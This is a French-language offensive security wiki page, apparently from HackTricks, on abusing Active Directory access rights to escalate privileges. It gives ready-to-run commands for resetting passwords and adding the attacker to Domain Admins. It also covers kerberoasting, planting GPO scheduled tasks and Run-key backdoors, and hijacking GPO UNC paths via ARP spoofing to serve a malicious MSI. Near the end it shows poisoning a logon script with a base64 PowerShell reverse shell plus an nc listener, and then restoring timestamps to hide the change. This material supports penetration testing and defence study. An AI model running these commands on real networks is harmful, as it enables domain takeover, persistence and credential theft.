# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est surtout un résumé des techniques provenant de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ce privilège donne à un attaquant un contrôle total sur un compte utilisateur cible. Une fois les droits `GenericAll` confirmés à l’aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Change the Target's Password** : En utilisant `net user <username> <password> /domain`, l’attaquant peut réinitialiser le mot de passe de l’utilisateur.
- From Linux, you can do the same over SAMR with Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si le compte est désactivé, effacez le flag UAC** : `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer le flag `ACCOUNTDISABLE` :
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Kerberoasting ciblé** : attribuer un SPN au compte de l'utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de casser les hashes du ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting** : Désactiver la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link** : Avec `GenericAll` sur un user, vous pouvez ajouter une credential basée sur un certificate et vous authentifier en tant que celui-ci sans changer son password. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Ce privilege permet à un attacker de manipuler les memberships de group s'il a les droits `GenericAll` sur un group comme `Domain Admins`. Après avoir identifié le distinguished name du group avec `Get-NetGroup`, l'attaquant peut :

- **Add Themselves to the Domain Admins Group** : Cela peut se faire via des commandes directes ou en utilisant des modules comme Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Depuis Linux, vous pouvez aussi exploiter BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous disposez de GenericAll/Write membership sur eux. Si le groupe cible est imbriqué dans « Remote Management Users », vous obtiendrez immédiatement un accès WinRM sur les hôtes qui honorent ce groupe :
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Détenir ces privilèges sur un objet computer ou un compte user permet :

- **Kerberos Resource-based Constrained Delegation** : permet de prendre le contrôle d’un objet computer.
- **Shadow Credentials** : utilisez cette technique pour usurper l’identité d’un compte computer ou user en exploitant les privilèges pour créer des shadow credentials.

## **WriteProperty on Group**

Si un user a des droits `WriteProperty` sur tous les objets d’un groupe spécifique (par exemple, `Domain Admins`), il peut :

- **S’ajouter au groupe Domain Admins** : réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) sur Group**

Ce privilège permet aux attaquants de s’ajouter eux-mêmes à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l’appartenance au groupe. L’utilisation de la séquence de commandes suivante permet l’auto-ajout :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilège similaire, il permet aux attaquants de s’ajouter directement à des groupes en modifiant les propriétés du groupe s’ils ont le droit `WriteProperty` sur ces groupes. La confirmation et l’exploitation de ce privilège s’effectuent avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Détenir le `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser les mots de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent se faire via PowerShell ou des outils de ligne de commande alternatifs, offrant plusieurs méthodes pour réinitialiser le mot de passe d’un utilisateur, y compris des sessions interactives et des one-liners pour les environnements non interactifs. Les commandes vont de simples invocations PowerShell à l’utilisation de `rpcclient` sur Linux, démontrant la polyvalence des vecteurs d’attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur Group**

Si un attaquant découvre qu’il dispose des droits `WriteOwner` sur un groupe, il peut modifier la propriété du groupe pour se l’attribuer. Cela a un impact particulier lorsque le groupe en question est `Domain Admins`, car changer la propriété permet un contrôle plus large sur les attributs et l’appartenance au groupe. Le processus consiste à identifier le bon objet via `Get-ObjectAcl`, puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID, soit par nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite sur User**

Cette permission permet à un attaquant de modifier les propriétés d’un utilisateur. Plus précisément, avec un accès `GenericWrite`, l’attaquant peut changer le chemin du script de connexion d’un utilisateur pour exécuter un script malveillant lors de la connexion de l’utilisateur. Cela se fait en utilisant la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l’utilisateur cible afin qu’elle pointe vers le script de l’attaquant.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite sur Group**

Avec ce privilège, les attaquants peuvent manipuler l'appartenance aux groupes, comme s'ajouter eux-mêmes ou ajouter d'autres utilisateurs à des groupes spécifiques. Ce processus implique de créer un objet d'identifiants, de l'utiliser pour ajouter ou supprimer des utilisateurs d'un groupe, et de vérifier les changements d'appartenance avec des commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Depuis Linux, Samba `net` peut ajouter/supprimer des membres lorsque vous avez `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posséder un objet AD et disposer des privilèges `WriteDACL` dessus permet à un attaquant de s’octroyer des privilèges `GenericAll` sur l’objet. Cela s’effectue via une manipulation ADSI, permettant un contrôle total de l’objet et la capacité de modifier ses appartenances à des groupes. Malgré cela, des limitations existent lorsqu’on tente d’exploiter ces privilèges à l’aide des cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Prise de contrôle rapide WriteDACL/WriteOwner (PowerView)

Lorsque vous avez `WriteOwner` et `WriteDacl` sur un utilisateur ou un compte de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe en utilisant PowerView sans connaître l'ancien mot de passe :
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes :
- Il peut être nécessaire de changer d’abord le owner pour vous-même si vous n’avez que `WriteOwner` :
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valider l'accès avec n'importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Replication on the Domain (DCSync)**

L'attaque DCSync exploite des permissions de réplication spécifiques sur le domain pour imiter un Domain Controller et synchroniser les données, y compris les identifiants des utilisateurs. Cette technique puissante nécessite des permissions comme `DS-Replication-Get-Changes`, permettant aux attackers d'extraire des informations sensibles de l'environnement AD sans accès direct à un Domain Controller. [**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

L'accès délégué pour gérer les Group Policy Objects (GPOs) peut présenter des risques de sécurité importants. Par exemple, si un user comme `offense\spotless` se voit déléguer des droits de gestion de GPO, il peut disposer de privilèges tels que **WriteProperty**, **WriteDacl** et **WriteOwner**. Ces permissions peuvent être abusées à des fins malveillantes, comme l'identifie PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Pour identifier les GPOs mal configurés, les cmdlets de PowerSploit peuvent être enchaînées. Cela permet de découvrir les GPOs qu'un user spécifique a la permission de gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied** : Il est possible de déterminer quels computers sont concernés par un GPO spécifique, ce qui aide à comprendre l'étendue de l'impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer** : Pour voir quelles policies sont appliquées à un computer particulier, des commandes comme `Get-DomainGPO` peuvent être utilisées.

**OUs with a Given Policy Applied** : L'identification des organizational units (OUs) affectées par une policy donnée peut se faire avec `Get-DomainOU`.

Vous pouvez également utiliser l'outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPOs et y trouver des problèmes.

### Abuse GPO - New-GPOImmediateTask

Des GPOs mal configurés peuvent être exploités pour exécuter du code, par exemple en créant une immediate scheduled task. Cela peut servir à ajouter un user au groupe local administrators sur les machines concernées, augmentant ainsi considérablement les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Le module GroupPolicy, s’il est installé, permet de créer et de lier de nouveaux GPOs, ainsi que de définir des préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs affectés. Cette méthode nécessite que le GPO soit mis à jour et qu’un utilisateur se connecte à l’ordinateur pour l’exécution:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuser GPO

SharpGPOAbuse offre une méthode pour abuser des GPO existants en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouveaux GPOs. Cet outil nécessite de modifier des GPO existants ou d’utiliser les outils RSAT pour en créer de nouveaux avant d’appliquer les modifications :
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour de la stratégie

Les mises à jour de GPO se produisent généralement environ toutes les 90 minutes. Pour accélérer ce processus, surtout après avoir effectué un changement, la commande `gpupdate /force` peut être utilisée sur l’ordinateur cible afin de forcer une mise à jour immédiate de la stratégie. Cette commande garantit que toute modification des GPO est appliquée sans attendre le prochain cycle de mise à jour automatique.

### Sous le capot

Lors de l’inspection des Scheduled Tasks d’une GPO donnée, comme la `Misconfigured Policy`, l’ajout de tâches telles que `evilTask` peut être confirmé. Ces tâches sont créées via des scripts ou des outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, comme montré dans le fichier de configuration XML généré par `New-GPOImmediateTask`, détaille les spécificités de la scheduled task - y compris la commande à exécuter et ses déclencheurs. Ce fichier représente la manière dont les scheduled tasks sont définies et gérées au sein des GPOs, en fournissant une méthode pour exécuter des commandes ou des scripts arbitraires dans le cadre de l’application de la stratégie.

### Users and Groups

Les GPOs permettent aussi la manipulation des appartenances aux users et groups sur les systèmes cibles. En modifiant directement les fichiers de stratégie Users and Groups, les attaquants peuvent ajouter des users à des groups privilégiés, comme le group local `administrators`. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui autorise la modification des fichiers de stratégie afin d’y inclure de nouveaux users ou de modifier les appartenances aux groups.

Le fichier de configuration XML pour Users and Groups décrit comment ces changements sont mis en œuvre. En ajoutant des entrées à ce fichier, des users spécifiques peuvent se voir accorder des privilèges élevés sur les systèmes affectés. Cette méthode offre une approche directe de l’élévation de privilèges via la manipulation de GPO.

En outre, d’autres méthodes pour exécuter du code ou maintenir la persistence, comme l’exploitation de scripts de logon/logoff, la modification de clés de registre pour les autoruns, l’installation de logiciels via des fichiers .msi, ou la modification de configurations de service, peuvent également être envisagées. Ces techniques offrent diverses voies pour maintenir l’accès et contrôler des systèmes cibles via l’abus des GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sur une OU/domain permet de modifier l’attribut `gPLink` du conteneur cible et de **forcer l’application d’une GPO existante** sans modifier la GPO elle-même. Cela devient intéressant lorsque la GPO liée référence déjà du contenu distant via des **UNC paths** (`\\HOST\share\...`), car les users authentifiés peuvent lire **SYSVOL** et rechercher hors ligne des stratégies réutilisables.

Workflow de haut niveau :

1. Utiliser BloodHound pour identifier un principal avec `WriteGPLink` sur une OU et énumérer les computers/users à l’intérieur de cette OU.
2. Cloner `SYSVOL` en lecture seule et analyser les GPOs à la recherche de **Software Installation**, de **drive mappings** (`Drives.xml`) et de scripts de **logon/startup** qui référencent des UNC paths.
3. Préférer les stratégies pointant vers un **nom d’hôte direct** (par exemple `\\DC02\share\pkg.msi`) plutôt que vers des chemins DFS/domain-namespace, car les chemins basés sur un nom d’hôte sont plus faciles à rediriger avec du L2 spoofing.
4. Ajouter le GUID de la GPO choisie au `gPLink` de l’OU cible afin que la victime traite cette stratégie déjà existante.
5. Sur le même broadcast domain, faire de l’ARP spoofing du host UNC et lier son IP localement (`ip addr add <target_ip>/32 dev <iface>`) afin que le trafic SMB de la victime atteigne votre host.
6. Exposer le chemin/filename attendu depuis un serveur SMB attaquant (par exemple `smbserver.py`) et attendre le traitement normal de la stratégie.

Exemple de collecte `SYSVOL` et de corrélation GPO :
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Lier le GPO existant à l'OU cible :
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Si le GPO lié déploie un MSI depuis un chemin UNC, le client le récupérera pendant le **démarrage de l’ordinateur** et l’installera en tant que **`NT AUTHORITY\SYSTEM`**. En usurpant l’hôte référencé et en servant un MSI malveillant sous le **même share/path/name**, vous pouvez transformer `WriteGPLink` en exécution de code SYSTEM **sans modifier SYSVOL**.

Contraintes importantes :

- **Le timing compte** : le nouveau lien est pris en compte lors du rafraîchissement de stratégie (généralement ~90 minutes), mais **Software Installation** se déclenche en général au **redémarrage**.
- Windows Installer suit généralement le déploiement à l’aide du **`ProductCode`** du package. Si le produit est déjà installé, le déploiement peut être ignoré.
- Pour éviter un rejet par l’installateur, patch le MSI rogue afin que son **`ProductCode`** et son **`PackageCode`** correspondent au package légitime attendu par le GPO.
- D’anciens fichiers d’annonce `.aas` peuvent rester dans `SYSVOL`, donc vérifiez que le déploiement semble toujours actif avant de vous y fier.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Les mappages de lecteurs GPP dans `Drives.xml` amènent les utilisateurs à s’authentifier vers le chemin UNC configuré lors de la connexion ou de la reconnexion. Si vous spoofez l’hôte référencé, vous pouvez capturer **NetNTLMv2**. Si SMB est volontairement fait pour échouer, Windows peut réessayer via **WebDAV**, en envoyant **NTLM over HTTP**, ce qui est bien plus flexible pour des relais vers **LDAP(S)**, **AD CS**, ou **SMB**.

#### Logon/startup script UNC hijack

Le même schéma s’applique aux scripts hébergés sur UNC découverts dans `SYSVOL` :

- Les **Logon scripts** s’exécutent généralement dans le contexte **user**.
- Les **Startup scripts** s’exécutent généralement dans le contexte **computer / SYSTEM**.

Si le chemin du script pointe vers un nom d’hôte spoofable, redirigez l’hôte UNC et servez un contenu de script de remplacement depuis l’emplacement attendu.

## SYSVOL/NETLOGON Logon Script Poisoning

Les chemins inscriptibles sous `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permettent de modifier des scripts de logon exécutés à la connexion des utilisateurs via GPO. Cela permet une exécution de code dans le contexte de sécurité des utilisateurs qui se connectent.

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Explorer les domain shares pour faire apparaître des raccourcis ou des références à des scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analyser les fichiers `.lnk` pour résoudre les cibles pointant vers SYSVOL/NETLOGON (astuce DFIR utile et pour les attaquants sans accès direct à GPO) :
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound affiche l’attribut `logonScript` (scriptPath) sur les nœuds utilisateur lorsqu’il est présent.

### Valider l’accès en écriture (ne pas faire confiance aux listes de partage)
Les outils automatisés peuvent afficher SYSVOL/NETLOGON comme en lecture seule, mais les ACL NTFS sous-jacentes peuvent toujours autoriser les écritures. Testez toujours :
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si la taille du fichier ou le mtime change, vous avez write. Préservez les originaux avant de modifier.

### Poison a VBScript logon script for RCE
Ajoutez une commande qui lance un reverse shell PowerShell (générez-le depuis revshells.com) et conservez la logique originale pour éviter de casser la fonction métier :
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Écoutez sur votre hôte et attendez la prochaine ouverture de session interactive :
```bash
rlwrap -cAr nc -lnvp 443
```
Notes :
- L'exécution se fait sous le token de l'utilisateur qui journalise (pas SYSTEM). La portée est le lien GPO (OU, site, domaine) qui applique ce script.
- Nettoyez en restaurant le contenu et les timestamps d'origine après utilisation.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
